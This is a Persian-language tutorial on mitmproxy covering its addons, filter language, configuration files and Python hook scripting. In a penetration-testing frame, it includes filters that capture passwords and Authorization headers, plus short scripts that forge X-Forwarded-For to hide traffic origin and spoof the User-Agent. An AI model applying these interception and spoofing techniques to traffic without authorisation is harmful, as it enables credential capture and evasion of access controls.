- **روش پیاده‌سازی و استفاده:** برای غیرفعال‌سازی پروتکل HTTP/2 و وادار کردن تمام اتصالات به استفاده از HTTP/1.1 (که تحلیل آن ساده‌تر است) یا تعیین یک گواهی سفارشی، می‌توانیم از گزینه‌های این افزونه استفاده کنیم:

```sh
mitmproxy --no-http2 --certs "*.example.com=/path/to/cert.pem"
```

این دستور، افزونه `TlsConfig` را برای استفاده از گواهی مشخص‌شده برای دامنه `example.com` پیکربندی می‌کند.

###### `Dumper`
- **توضیح:** افزونه `Dumper`، وظیفه نمایش و قالب‌بندی خروجی اطلاعات مربوط به جریان‌های ترافیکی (flows) را در کنسول بر عهده دارد. این افزونه، موتور اصلی نمایش اطلاعات در ابزار `mitmdump` و همچنین بخش‌های لاگ در `mitmproxy` و `mitmweb` است.
    
- **سناریوی استفاده:** در یک سناریوی تحلیل خودکار با `mitmdump`، ما نیاز داریم تا فقط اطلاعات مربوط به درخواست‌ها و پاسخ‌های یک دامنه خاص را با جزئیات کامل ببینیم. در این حالت، افزونه `Dumper` را برای فیلتر کردن و افزایش سطح جزئیات پیکربندی می‌کنیم.
    
- **مکانیزم عملکرد:** این افزونه با دریافت رویدادهای مختلف از پروکسی، اطلاعات مربوط به هر جریان (Flow) را بر اساس تنظیمات `flow_detail` (سطوح 0 تا 4) و `dumper_filter` فیلتر و قالب‌بندی می‌کند. برای مثال، در سطح جزئیات 3، محتوای کامل درخواست و پاسخ نیز نمایش داده می‌شود.
    
- **روش پیاده‌سازی و استفاده:** برای ذخیره‌سازی لاگ‌ها در یک فایل و مشاهده فقط ترافیک مربوط به یک هاست خاص با جزئیات بالا، از دستور زیر استفاده می‌کنیم:
```sh
mitmdump -w output.flow --dumper-filter "~d example.com" --flow-detail 3
```

این دستور، یک فایل خروجی ایجاد کرده و از `Dumper` می‌خواهد که در کنسول، فقط جریان‌های مربوط به `example.com` را با حداکثر جزئیات نمایش دهد.

###### `NextLayer`
- **توضیح:** افزونه NextLayer یکی از مهم‌ترین بخش‌های هوشمند mitmproxy است. وظیفه این افزونه، تشخیص این است که پس از پذیرش یک اتصال TCP، چه پروتکل لایه بالاتری باید روی آن سوار شود. به عبارت ساده، NextLayer تصمیم می‌گیرد که آیا یک اتصال، HTTP ساده است، TLS رمزنگاری‌شده، WebSocket، یا یک اتصال TCP خام.

- **سناریوی استفاده:** فرض کنید پروکسی ما بر روی پورت 8080 در حال اجراست و یک کلاینت به آن متصل می‌شود. NextLayer با بررسی بایت‌های اولیه داده (ClientHello در TLS یا یک درخواست HTTP)، پروتکل را تشخیص داده و لایه پردازشی مناسب را برای ادامه ارتباط فعال می‌کند. این قابلیت، مبنای کارکرد پروکسی در حالت‌های مختلف است.

- **مکانیزم عملکرد:** NextLayer لیستی از "بازرس‌ها" (inspectors) را مدیریت می‌کند. هر بازرس، یک پروتکل خاص (مثل TLS، HTTP، WebSocket) را بررسی می‌کند. افزونه با دریافت اولین بسته‌های داده، آن‌ها را به ترتیب اولویت به بازرس‌ها می‌دهد تا زمانی که یکی از آن‌ها پروتکل را شناسایی کند. سپس لایه مربوطه ایجاد شده و جایگزین لایه خام TCP می‌شود.

- **روش پیاده‌سازی و استفاده:** اگرچه NextLayer یک افزونه داخلی و خودکار است، اما رفتار آن را می‌توان از طریق تنظیمات غیرفعال کرد یا تغییر داد. برای مثال، اگر بخواهیم تمام اتصالات ورودی به صورت TCP خام و بدون هیچ تشخیص خودکاری باقی بمانند، می‌توانیم با استفاده از فلگ `raw-tcp--` این افزونه را دور بزنیم.

```sh
mitmproxy --raw-tcp
```

###### `ConnectionHandler`
- **توضیح:** افزونه ConnectionHandler، مدیر چرخه حیات هر اتصال منفرد در mitmproxy است. از لحظه‌ای که یک کلاینت متصل می‌شود تا زمانی که اتصال بسته شود، این افزونه مسئول اصلی هماهنگی بین لایه‌های مختلف پروتکل، انتقال داده، و مدیریت خطاها است.

- **سناریوی استفاده:** تصور کنید یک مرورگر از طریق پروکسی ما یک فایل حجیم را دانلود می‌کند. ConnectionHandler داده‌های در حال دریافت از سرور را دریافت کرده، در صورت نیاز آن‌ها را از لایه‌های مختلف (TLS، HTTP) عبور داده و به سمت کلاینت هدایت می‌کند. همچنین اگر در حین انتقال، کلاینت یا سرور اتصال را قطع کند، این افزونه رویدادهای مربوطه را صادر می‌کند.

- **مکانیزم عملکرد:** این افزونه به ازای هر اتصال، یک نمونه جداگانه ایجاد می‌کند. هر نمونه، یک ماشین حالت (state machine) را مدیریت می‌کند که شامل مراحل مختلفی مانند start، handshake، established و closing است. داده‌ها بین لایه‌های مختلف پروتکل که توسط NextLayer روی هم چیده شده‌اند، رد و بدل می‌شود.

- **روش پیاده‌سازی و استفاده:** ConnectionHandler عموماً یک افزونه زیرساختی است که کاربر مستقیماً با آن تعامل ندارد، اما رویدادهای حیاتی مانند clientconnect، clientdisconnect، server_connect و server_disconnected را صادر می‌کند که ما می‌توانیم در اسکریپت‌های خود به آن‌ها واکنش نشان دهیم.
##### mitmproxy Filtering System
سیستم فیلترینگ mitmproxy یک زبان مختص به خود و بسیار قدرتمند است که به ما اجازه می‌دهد ترافیک مورد نظر خود را با دقت بالا از میان انبوهی از داده‌ها جداسازی، رهگیری و دستکاری کنیم. تسلط بر این زبان، کلید استفاده حرفه‌ای از ابزار است.
###### Filtering Syntax & Operators
فیلترها بر اساس یک گرامر مشخص نوشته می‌شوند و می‌توان آن‌ها را با عملگرهای منطقی ترکیب کرد. از فیلترها در مکان های مختلفی مانند فلگ های `i-` و یا `f-` استفاده میشود. همچنین فیلترها با `~` شروع می‌شوند، مثلا `u~` برای URL و `d~` برای دامنه استفاده میشود. این فیلترها را میتوانیم با عملگرها(Operators) ها ترکیب کنیم.

- **فیلترها:**
1. `~d DOMAIN` فیلتر بر اساس دامنه (Domain)
	مثال: `d google.com~` یعنی تمام ترافیک به/از google.com

2. `~u REGEX` فیلتر بر اساس URL (کل مسیر)
	مثال: `u /api/user~` رهگیری فقط درخواست‌های API کاربر.

3. `~m REGEX` فیلتر بر اساس متد HTTP
	مثال: `m POST~`: فقط درخواست‌های POST.

4. `~c CODE` فیلتر بر اساس کد وضعیت HTTP.
	مثال: `c 500~` فقط پاسخ‌های با خطای 500.

5. `~h REGEX`	جستجوی عبارت در هدرهای درخواست و پاسخ.
	مثال: `"h "Content-Type~` فیلتر بر اساس نوع محتوا.

6. `~hq REGEX` جستجوی عبارت فقط در هدرهای درخواست.
	مثال: `"hq "Authorization~`	رهگیری درخواست‌های حاوی توکن.

7. `~hs REGEX` جستجوی عبارت فقط در هدرهای پاسخ.
	مثال: `"hs "Server: Apache~` فیلتر پاسخ‌های یک سرور آپاچی

8. `~b REGEX` جستجوی عبارت در بدنه درخواست و پاسخ.
	مثال: `"b "password~`	هشدار امنیتی برای یافتن کلمه عبور.

9. `~http` فیلتر کردن فقط پروتکل‌های HTTP.
	مثال: برای نادیده گرفتن ترافیک خام TCP استفاده میشود.

10. `~q` فیلتر کردن فقط درخواست‌ها (بدون پاسخ).
	مثال: `u /login & ~q~`: رهگیری درخواست ورود قبل از ارسال.

-----------

- **عملگرهای منطقی:**
1. `&` (یا فاصله خالی): عملگر `AND` (و). مثال:
	`~http & ~c 200` HTTP Protocol and 200 HTTP Status Code

2. `|` عملگر OR (یا). مثال: 
	`~d example.com | ~d api.example.com` example.com or api.example.com

3. `!` عملگر NOT (نفی، نیست). مثال:
	`!~c 200` Not 200 HTTP Status Codes

4. `(...)` برای گروه‌بندی عبارات استفاده می‌شود. مثال:
	`!(~c 200 | ~c 304)` Not 200 & 304 HTTP Status Codes

- **نکته مهم:** برخی فیلترها مانند `u، ~m~ و d~` به طور پیش‌فرض نسبت به حروف بزرگ و کوچک حساس نیستند، در حالی که فیلترهای مربوط به هدر مانند `hq~` حساس هستند.
###### Filters Usage Guide
- **`-f`| `set view_filter` - فیلتر فقط نمایش:**
	**عملکرد:** این فیلتر مشخص می‌کند که چه جریان‌هایی (flows) در واسط کاربری نمایش داده شوند. ترافیکی که با فیلتر مطابقت نداشته باشد، توسط پروکسی پردازش می‌شود، اما در لیست نمایشی ظاهر نمی‌شود. برای خلوت‌سازی دید و تمرکز بر روی یک هدف خاص استفاده می‌شود.
	**نحوه استفاده:** 
		فشردن کلید `f` در mitmproxy
		استفاده از فلگ `f-`
		استفاده از ساب کامند `set view_filter`

- **`-i INTERCEPT` | `set intercept` - فیلتر رهگیری:**
	**عملکرد:** این فیلتر بسیار مهم‌تر و تهاجمی‌تر است. مشخص می‌کند که کدام جریان‌ها برای بازبینی و تغییر توسط ما متوقف (Pause) شوند . یک درخواست یا پاسخ رهگیری‌شده، تا زمانی که ما دستور ادامه (Resume) را صادر نکنیم، به مقصد نمی‌رسد. این قابلیت برای دستکاری دقیق ترافیک قبل از ارسال آن به سرور یا کلاینت استفاده می‌شود .
	**نحوه استفاده:** 
		فشردن کلید `i` در mitmproxy
		استفاده از فلگ `i-`
		استفاده از ساب کامند `set intercept`


##### mitmproxy Configuration Methods
###### mitmproxy Configuration Methods
ابزار mitmproxy یک سیستم پیکربندی سه‌لایه و بسیار انعطاف‌پذیر دارد که به ما اجازه می‌دهد رفتار ابزار را در سطوح مختلف و با روش‌های گوناگون تنظیم کنیم. 

* **لایه‌های پیکربندی عبارتند از:**
	1. **فلگ‌های خط فرمان**: برای اولویت‌دهی به تنظیمات در هر بار اجرا.
	2. **فایل `config.yaml`**: برای ذخیره‌سازی دائمی تنظیمات.
	3. **تنظیمات تعاملی**: برای تغییر تنظیمات به صورت زنده در حین اجرا.

- همچنین بصورت پیشرفته با استفاده از اسکریپت نویسی پایتون نیز میتوانیم رفتار mitmproxy را کنترل کنیم و ابزار را با تنظیمات دلخواه خود اجرا کنیم.

######  `config.yaml` - Description
این فایل، محل اصلی برای ذخیره تنظیمات دائمی ما است. به طور پیش‌فرض به دنبال فایل `config.yaml` در مسیر زیر قرار دارد اما می‌توانیم با فلگ `conf--` یک مسیر دیگر را به آن معرفی کنیم:
	Linux: `~/.mitmproxy/`
	Windows: `C:\Users\<username>\.mitmproxy\config.yaml`

- **ساختار `config.yaml`**
	- ساختار این فایل بسیار ساده است؛ نام تنظیم: مقدار 
	- تقریباً هر فلگ خط فرمان، معادلی در این فایل دارد. 
```yaml
listen_host: 127.0.0.1
listen_port: 8080
mode: regular
allow_remote: true
```

- **تولید `config.yaml` شخصی سازه شده :**
	- بهترین راه برای تولید یک فایل پیکربندی با تمامی گزینه‌های موجود (و مقادیر پیش‌فرضشان)، استفاده از `mitmdump` در خود ابزار است:
```sh
mitmdump --options > ~/.mitmproxy/config.yaml
```

این دستور یک فایل کامل با تمام تنظیمات و توضیحات آنها تولید می‌کند. سپس می‌توانیم مقادیر مورد نظر خود را تغییر دهیم و در اجرای بعدی mitmproxy را با کانفیگ های دلخواه خود اجرا کنیم:
```sh
mitmproxy --conf /path/to/config.yml
```

######  `config.yaml` - Config Sample
**مثال از محتوای `config.yaml`:** در این مثال، چند تنظیم رایج را مشاهده می‌کنیم:
```yaml
#~/.mitmproxy/config.yaml
listen_port: 8888
mode: "regular"
flow_detail: 3
anticache: true
showhost: true
script: "~/mitm_scripts/injector.py"
```
در این فایل، پورت پروکسی را به 8888 تغییر دادیم، سطح جزئیات لاگ را بالا بردیم، و یک اسکریپت را برای بارگذاری در هر بار اجرا مشخص کرده‌ایم. پارامترهای قابل تنظیم در این فایل، بسیار گسترده‌اند و کامل‌ترین مرجع آن، دستور `options--` است. برخی از مهم‌ترین پارامترها عبارتند از:

- `listen_host` و `listen_port`: آدرس و پورت شنود پروکسی.
    
- `mode`: حالت پروکسی (`regular`, `transparent`, `reverse` و غیره).
    
- `upstream_server`: برای مشخص کردن یک پروکسی بالادستی.
    
- `certs`: مسیر گواهی‌های سفارشی TLS
    
- `ssl_insecure`: غیرفعال‌سازی بررسی اعتبار گواهی‌ها.
    
- `scripts`: لیستی از اسکریپت‌ها که باید بارگذاری شوند.
    
- `modify_headers` و `modify_body`: اعمال فیلترهای جایگزینی.
    
- `block_global` و `block_list`: مسدود کردن دامنه‌ها.

###### `Options` Engine
در قلب سیستم پیکربندی mitmproxy، یک موتور قدرتمند به نام `Options` قرار دارد. این موتور، یک مخزن متمرکز و یکپارچه برای تمام تنظیمات پروکسی است که سازوکارهای پیشرفته‌ای برای مدیریت آن‌ها فراهم می‌کند.

**نحوه عملکرد و استخراج گزینه‌ها:**  
موتور Options، لیست کامل تنظیمات (شامل نام، نوع داده، مقدار پیش‌فرض و توضیحات) را نگهداری می‌کند. این کار به mitmproxy امکان می‌دهد تا:

1. مستندات کامل تنظیمات را به صورت خودکار تولید کند (دقیقاً همان چیزی که با فلگ `options--` می‌بینیم).
    
2. اعتبارسنجی خودکار مقادیر را انجام دهد (مثلاً اگر برای پورت یک رشته وارد کنیم، خطا میدهد).
    
3. به‌روزرسانی زنده و اطلاع‌رسانی به افزونه‌ها را انجام دهد، از طریق قلاب‌های `configure` و `optionschanged`.
    

**روش‌های تعامل با موتور Options:**
1. **از طریق خط فرمان:** این متداول‌ترین روش است. هر فلگ خط فرمان، مستقیماً یک گزینه را در این موتور تنظیم می‌کند. تنظیمات از طریق فلگ‌ها، اولویت بالاتری نسبت به فایل `config.yaml` دارند.
    
2. **از طریق فایل `config.yaml`:** مقادیر پایه و دائمی از این فایل خوانده می‌شوند .
    
3. **به صورت تعاملی (Interactive):** در واسط گرافیکی `mitmweb` و به خصوص در واسط متنی `mitmproxy`، می‌توانیم به صورت زنده تنظیمات را تغییر دهیم. در `mitmproxy`، با فشردن کلید `O` (حرف O بزرگ) وارد صفحه تنظیمات می‌شویم. در این صفحه می‌توانیم هر گزینه‌ای را جستجو کرده، مقدار فعلی آن را ببینیم، و با فشردن `Enter` آن را ویرایش کنیم. تغییرات اعمال‌شده در این روش، فوراً بر روی پروکسی در حال اجرا اعمال می‌شود و در صورت نیاز، رویداد `optionschanged` برای تمام افزونه‌ها صادر می‌شود تا آن‌ها نیز خود را با شرایط جدید وفق دهند.
    
4. **از طریق API اسکریپت‌نویسی:** درون یک اسکریپت، می‌توانیم مقادیر گزینه‌ها را از طریق `ctx.options` بخوانیم:

```python
from mitmproxy import ctx
def request(self, flow):
    if ctx.options.flow_detail > 3:
        logging.info("Very Verbose Logging is On")
```
- با این روش می‌توانیم رفتار اسکریپت خود را بر اساس پیکربندی کلی پروکسی تنظیم کنیم.

این سیستم یکپارچه و سه لایه‌ای، انعطاف‌پذیری خارق‌العاده‌ای به mitmproxy می‌بخشد و آن را برای استفاده در سناریوهای بسیار متنوع، از یک تست ساده تا یک سیستم تحلیل خودکار و دائمی، مناسب می‌سازد.
##### mitmproxy Scripting (Hooks & API) - Structure & Lifecycle
###### What is mitmproxy Script?
- **اسکریپت mitmproxy چیست؟**
هر اسکریپت mitmproxy یک ماژول پایتون است که یک یا چند "افزونه" (Addon) را تعریف می‌کند. یک افزونه، کلاسی است که متدهای آن به رویدادهای خاصی از پروکسی متصل می‌شوند. زمانی که پروکسی آن رویداد را تجربه کند (مثلاً دریافت یک درخواست HTTP)، متد متناظر در افزونه ما به طور خودکار فراخوانی می‌شود.

برای استفاده حرفه‌ای از mitmproxy، به‌کارگیری اسکریپت‌های پایتون که با فلگ `s-` یا `script--` بارگذاری می‌شوند، یک ضرورت است. این اسکریپت‌ها قلب تپنده شخصی‌سازی در mitmproxy هستند و از طریق یک API رویداد-محور (Event-Driven API) به نام "قلاب‌ها" (Hooks)، به ما اجازه می‌دهند در هر مرحله از چرخه حیات یک درخواست و پاسخ HTTP مداخله کنیم. همچنین تمامی افزونه‌های داخلی mitmproxy نیز با استفاده از همین قلاب‌ها توسعه یافته‌اند. 

پیش از آنکه به جزئیات قلاب‌ها و افزونه‌ها بپردازیم، ابتدا باید با ساختار و قواعد کلی نوشتن یک اسکریپت برای mitmproxy آشنا شویم. این دانش، پیش‌نیاز اصلی برای پیاده‌سازی تمامی اسکریپت ها و سفارشی‌سازی‌هایی است که در ادامه بررسی می‌کنیم.
###### Structure & Syntax - How Writing mitmproxy Scripts?
**قاعده اصلی و ساختار اسکریپت:**
1. یک کلاس پایتون تعریف می‌کنیم که متدهای آن، همان قلاب‌هایی هستند که می‌خواهیم به آن‌ها واکنش نشان دهیم.
    
2. یک نمونه از این کلاس را در یک لیست سراسری به نام `addons` قرار می‌دهیم. mitmproxy این لیست را در هنگام بارگذاری اسکریپت جستجو کرده و افزونه‌های ما را شناسایی و ثبت می‌کند.

ابزار mitmproxy برای بارگذاری اسکریپت‌های شخصی، دو روش اصلی را پشتیبانی می‌کند:

1. **روش اول: استفاده از کلاس (Class-based Addon)**  
این روش، استاندارد و توصیه‌شده برای اسکریپت‌های پیچیده و حرفه‌ای است. در این روش، یک کلاس پایتون تعریف می‌کنیم که متدهای آن، همان قلاب‌هایی (Hooks) هستند که میخواهیم به آن‌ها واکنش نشان دهیم. سپس یک نمونه از این کلاس را در یک لیست سراسری به نام `addons` قرار می‌دهیم. mitmproxy این لیست را خوانده و افزونه‌های ما را بارگذاری می‌کند.
```python
import logging

class MyAddon:
    def __init__(self):
        self.num = 0

    def request(self, flow):
        self.num = self.num + 1
        #Logged Requests Flows Count
        logging.info(f"We've seen {self.num} flows")
        #Logged Destination URL
        logging.info(f"New request to: {flow.request.pretty_url}")

addons = [MyAddon()]
```

- **نکات کلیدی در این روش:**
	1. شی addon دقیقاً یکبار هنگام بارگذاری اسکریپت ساخته می‌شود و در تمام طول عمر پروکسی در حافظه باقی می‌ماند.
	2. متد `__init__` برای مقداردهی اولیه و تنظیم وضعیت داخلی افزونه استفاده می‌شود. بنابراین اگر متغیری برای مقدار دهی نداریم استفاده از `__init__` ضروری نیست.
	3. مقدار `flow.request.pretty_url` برای برگرداندن URL مقصد درخواست HTTP است که از پراکسی عبور میکند. بجای این مقدار میتوانیم از سایر مقادیر که جلوتر به آنها میپردازیم استفاده کنیم.
	4. متدها باید دقیقاً با نام رویدادهای (events) تعریف‌شده در mitmproxy مطابقت داشته باشد.

2. **روش دوم: سینتکس خلاصه‌شده (Abbreviated Syntax)**  
این روش برای نوشتن اسکریپت‌های ساده و کوتاه بسیار مناسب است. در این روش، به جای تعریف یک کلاس، توابع مدیریت رویداد را مستقیماً در سطح ماژول (module-level) تعریف می‌کنیم. mitmproxy در این حالت، کل ماژول را به عنوان یک شی Addon در نظر می‌گیرد.
```python
"""An addon using the abbreviated scripting syntax."""

def request(flow):
    flow.request.headers["myheader"] = "value"
```

- **نکات کلیدی در این روش:**
	1. در این روش، از لیست `addons` استفاده نمی‌شود. mitmproxy به صورت خودکار توابع سطح ماژول را اسکن کرده و آن‌ها را به رویدادهای متناظر متصل می‌کند.
	2. در این روش مقدار فیلد `myheader` در Header درخواست HTTP که از پراکسی عبور کرده است را تغییر دادیم.

3. **بارگذاری و استفاده از اسکریپت:**
	- برای بارگذاری این اسکریپت که آن را `basic_example.py` نام‌گذاری کرده‌ایم، از دستور زیر استفاده می‌کنیم:
```sh
mitmproxy -s basic_example.py
```

###### mitmproxy Hooks Lifecycle
هر افزونه، از یک چرخه حیات مشخص پیروی می‌کند. درک این چرخه برای مدیریت صحیح منابع، نوشتن اسکریپت و پیکربندی حیاتی است.

1. **بارگذاری و پیکربندی:** هنگامی که mitmproxy یک اسکریپت را بارگذاری می‌کند، به ترتیب قلاب‌های `load` (برای ثبت گزینه‌ها و دستورات جدید) و سپس `configure` (برای خواندن مقادیر تنظیمات) را فراخوانی می‌کند.

2. **آمادگی:** پس از آنکه تمامی اجزای پروکسی راه‌اندازی شدند، قلاب `running` فراخوانی می‌شود تا به افزونه اطلاع دهد که سیستم آماده پردازش ترافیک است.

3. **پایان کار:** هنگام خروج از برنامه یا بارگذاری مجدد اسکریپت (Live Reload)، قلاب `done` فراخوانی می‌شود تا افزونه بتواند منابع خود را آزاد کرده و کارهای نهایی مانند ذخیره‌سازی داده‌ها را انجام دهد.

###### mitmproxy Scripting Features
1. **Logging and Context:**
یکی از مهم‌ترین قواعد، نحوه صحیح لاگ‌نویسی است. اسکریپت‌ها نباید مستقیماً از `print` یا `sys.stdout` استفاده کنند. در عوض، باید از ماژول استاندارد `logging` پایتون استفاده کنند. همچنین mitmproxy یک شیء `ctx` (context) را فراهم می‌کند که دسترسی به اشیاء اصلی برنامه مانند `ctx.master` و `ctx.options` را ممکن می‌سازد.

```python
import logging
from mitmproxy import ctx

class MyAddon:
    def request(self, flow):
        #Use logging
        logging.info(f"Processing request to {flow.request.pretty_host}")
        #Access to Settings
        if ctx.options.flow_detail > 2:
            logging.debug(f"Full request: {flow.request.text}")
```

2. **Live Reloading**
یکی از قابلیت‌های بسیار قدرتمند mitmproxy برای توسعه‌دهندگان، قابلیت `Live Reloading` است. اگر اسکریپتی را با فلگ `s-` بارگذاری کنیم، mitmproxy به صورت خودکار تغییرات فایل را زیر نظر گرفته و در صورت مشاهده ذخیره شدن اسکریپت، آن را مجدداً بارگذاری می‌کند. این کار چرخه توسعه را به شدت سریع می‌کند.

3. **Testing:**
برای اطمینان از صحت عملکرد افزونه‌ها، mitmproxy ابزارهای تست مخصوصی را در پکیج `mitmproxy.test` ارائه می‌دهد. مهم‌ترین آن‌ها `()taddons.context` برای شبیه‌سازی محیط اجرا و `()tflow.tflow` برای ساخت جریان‌های ترافیکی مصنوعی است. با استفاده از این قابلیت پیش از استفاده از اسکریپت در محیط واقعی میتوانیم آنرا در محیط آزمایشی تست کنیم و در صورت نیاز خطاها را برطرف کنیم و یا ساختار را تغییر دهیم.

##### mitmproxy Scripting (Hooks & API) - Lifecycle Hooks
در این بخش Hooks های اصلی مربوط Hooks Lifecycle را بررسی میکنیم.
###### `load(loader)` Submit new Argument
- **توضیح تئوری:** این قلاب، اولین تابعی است که هنگام بارگذاری یک اسکریپت یا افزونه فراخوانی می‌شود. کاربرد اصلی آن، معرفی گزینه‌های پیکربندی جدید (options) یا دستورات سفارشی (commands) به موتور mitmproxy است.
    
- **سناریوی استفاده:** می‌خواهیم افزونه‌ای بنویسیم که قابلیت خواندن یک API Key سفارشی از خط فرمان را داشته باشد. در این قلاب، آرگومان `api_key` را تعریف و ثبت می‌کنیم.
    
- **مکانیزم عملکرد:** تابع `load` یک شیء `loader` دریافت می‌کند که واسطی برای تعامل با هسته اصلی mitmproxy است. با استفاده از متد `loader.add_option` می‌توانیم پارامتر جدیدی را به مجموعه تنظیمات ابزار اضافه کنیم.
    
- **روش پیاده‌سازی:**
```python
from mitmproxy import ctx

class MyAddon:
    def load(self, loader):
        loader.add_option(
            name="api_key",
            typespec=str,
            default="",
            help="API Key for external service"
        )

addons = [MyAddon()]
```
###### `Configure(update)` Read/Change an Argument Value
- **توضیح:** این قلاب بلافاصله پس از load و هر بار که تنظیمات mitmproxy تغییر می‌کند (مثلاً با دستور set در محیط تعاملی)، فراخوانی می‌شود. برای خواندن مقادیر تنظیمات و اعمال آن‌ها در افزونه استفاده می‌شود .

- **سناریوی استفاده:** می‌خواهیم مقدار `api_key` که در مرحله قبل تعریف کردیم را بخوانیم و آماده استفاده کنیم.

- **مکانیزم عملکرد:** یک مجموعه (set) به نام updated به تابع ارسال می‌شود که شامل نام تنظیماتی است که اخیراً تغییر کرده‌اند. اگر این مجموعه خالی باشد، به معنی فراخوانی اولیه است.

- **روش پیاده‌سازی:**
```python
def configure(self, updated):
    if "api_key" in updated:
        self.api_key = ctx.options.api_key
```

###### `running()` Logged a Message after Proxy Run
- **توضیح:** این قلاب، نقطه‌ای است که تضمین می‌کند mitmproxy به طور کامل راه‌اندازی و آماده پردازش ترافیک است. برای اجرای وظایفی که نیاز به آماده بودن کامل سیستم دارند، استفاده می‌شود.

- **سناریوی استفاده:** می‌خواهیم درست پس از راه‌اندازی پروکسی، یک پیام مبنی بر اجرای موفق به همراه شماره پورت که پراکسی در آن اجرا شده است را در لاگ ثبت کنیم.

- **مکانیزم عملکرد:** این تابع بدون آرگومان خاصی فراخوانی می‌شود.

**روش پیاده‌سازی:**
```python
def running(self):
    port = ctx.options.listen_port
    logging.info(f"Custom addon is ready! Proxy listening on port {port}")
```

###### `done()` Write Requests Counts into a File
- **توضیح:** نقطه مقابل load است و هنگام خروج از mitmproxy یا توقف افزونه فراخوانی می‌شود. برای پاک‌سازی منابع، بستن اتصالات و ذخیره‌سازی نهایی داده‌ها استفاده می‌شود .

- **سناریوی استفاده:** یک شمارنده داریم که تعداد درخواست‌های پردازش‌شده را می‌شمارد و می‌خواهیم مقدار نهایی آن را در انتها در یک فایل ذخیره کنیم.

- **مکانیزم عملکرد:** تابع بدون آرگومان است.

**روش پیاده‌سازی:**
```python
def done(self):
    with open("request_count.txt", "w") as f:
        f.write(str(self.request_count))
```

###### `optionschanged()` Real Time Options Changer
- **توضیح:** این Hook که بخشی از چرخه حیات است، هر بار که هر یک از تنظیمات (options) در mitmproxy تغییر کند، فراخوانی می‌شود. این تنظیمات می‌توانند از طریق خط فرمان، فایل کانفیگ، یا به صورت تعاملی تغییر کرده باشند.

- **سناریوی استفاده:** یک افزونه داریم که یک فایل لاگ سفارشی باز می‌کند. اگر کاربر مسیر فایل لاگ را از طریق تنظیمات تغییر دهد، باید فایل قبلی بسته و فایل جدید باز شود.

- **مکانیزم عملکرد:** مجموعه updated شامل نام گزینه‌هایی است که تغییر کرده‌اند. با مقایسه آن با نام گزینه خود، می‌توانیم واکنش نشان دهیم.

- **روش پیاده‌سازی:**
```python
def optionschanged(self, updated):
    if "custom_log_path" in updated:
        self.reopen_log_file(ctx.options.custom_log_path)
```
##### mitmproxy Scripting (Hooks & API) - Connection Hooks
در این بخش Hooks های مربوط به اتصالات را بررسی میکنیم.
###### `clientconnect(client)` & `clientdisconnect(client)`
- **توضیح:** این قلاب‌ها، شروع و پایان هر اتصال از سمت کلاینت به پروکسی را اطلاع‌رسانی می‌کنند.
    
- **سناریوی استفاده:** می‌خواهیم لیستی از تمام IP هایی که به پروکسی ما متصل می‌شوند را ثبت کنیم.
    
- **مکانیزم عملکرد:** یک شیء `Client` به تابع ارسال می‌شود که اطلاعاتی مانند `client.address` را در خود دارد.
    
- **روش پیاده‌سازی:**
```python
def clientconnect(self, client):
    logging.info(f"New client connected: {client.peername}")
```
###### `server_connect(conn)` & `server_connected(conn)`
- **توضیح تئوری:** به ترتیب، نشان‌دهنده شروع و پایان موفقیت‌آمیز فرآیند اتصال پروکسی به سرور مقصد هستند.
    
- **سناریوی استفاده:** در این مثال میخواهیم قبل از اتصال به سرور، آدرس مقصد را از `example.com` به `test.com` تغییر دهیم.
    
- **مکانیزم عملکرد:** `server_connect` یک شیء `ServerConnectionHookData` می‌گیرد که فیلد `address` در آن قابل تغییر است.
    
- **روش پیاده‌سازی:**
```python
def server_connect(self, data):
    if data.address[0] == "example.com":
        data.address = ("test.com", 80) 
```

##### mitmproxy Scripting (Hooks & API) - HTTP Request & Response Hook
در این بخش، چندین نمونه از Hook هایی که برای مدیریت و تغییر در درخواست ها و پاسخ های پروتکل HTTP میتوان استفاده کرد را با ذکر چندین مثال بررسی میکنیم.
###### Hooks for working with HTTP Request & HTTP Response 
برای نوشتن اسکریپت‌های مؤثر، نیاز به درک عمیق از اشیاء اصلی داریم که در اختیار ما قرار می‌گیرند. مهم‌ترین این اشیاء، `flow` است که از نوع `mitmproxy.http.HTTPFlow` می‌باشد و تمامی اطلاعات یک تراکنش HTTP را در خود جای داده است.

- **`flow.request`**:
	شیء از نوع `mitmproxy.http.Request` که شامل تمام جزئیات درخواست ارسالی از کلاینت است. ویژگی‌های مهم آن عبارتند از:

- `flow.request.url`: 
	آدرس کامل درخواست.

- `flow.request.method`: 
	متد HTTP (مانند `GET`، `POST`).

- `flow.request.headers`
	یک شی شبیه به دیکشنری برای مدیریت هدرهای درخواست.

- `flow.request.text`: 
	محتوای بدنه درخواست به صورت رشته.

- `flow.request.content`: 
	محتوای بدنه درخواست به صورت بایت.

- **`flow.response`**:
	شیء از نوع `mitmproxy.http.Response` که شامل پاسخ دریافتی از سرور است. ساختاری مشابه `flow.request` دارد (ویژگی‌های `headers`، `text`، و `status_code`).

###### `flow.request` Change Headers to bypass Limits
- **توضیح تئوری:** شیء `flow` امکان مشاهده و دستکاری کامل درخواست و پاسخ را فراهم می‌کند. `request` هم دسترسی به اطلاعاتی که در درخواست HTTP ارسال میشوند را فراهم میکند. همچنین هر درخواست HTTP دارای Header هایی است که اطلاعاتی از محتوای ارسالی و دستگاه ارسال کننده را دربر دارد. مثلا هدر `User-Agent` مشخص کننده این است که چه دیوایسی درخواست را ارسال کرده است و یا `X-Forwarded-For` منشا ترافیک را نشان میدهد.
    
- **سناریوی استفاده:** دستکاری هدرها برای دور زدن محدودیت‌ها
	- مثال اول: می‌خواهیم در یک تست نفوذ، یک هدر جعلی `X-Forwarded-For` به تمام درخواست‌های عبوری اضافه کنیم تا منشأ ترافیک مخفی شود.
	- مثال دوم: در یک تست نفوذ با تغییر مقدار `User-Agent` درخواست‌ها وانمود میکنیم که درخواست را یک دیوایس آیفون ارسال کرده است.
    
- **مکانیزم عملکرد:** با دسترسی به `flow.request.headers` می‌توانیم هدرها را دستکاری کنیم.
    
**روش پیاده‌سازی:**
1. **مثال اول:** مخفی کردن منشا ترافیک - روش Abbreviated Syntax
```python
def request(self, flow):
    flow.request.headers["X-Forwarded-For"] = "1.2.3.4"
```

2. **مثال دوم:** تغییر دیوایس ارسال کننده - روش Class-based Addon
```python
class SpoofUserAgent:
    def request(self, flow):
        #Set User-Agent on Mobile Device
        flow.request.headers["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"

addons = [SpoofUserAgent()]
```
- با این روش میتوانیم هر فیلد و یا پارامتر دیگر درون HTTP Request را نیز تغییر دهیم.
###### `flow.response` Change Response Body
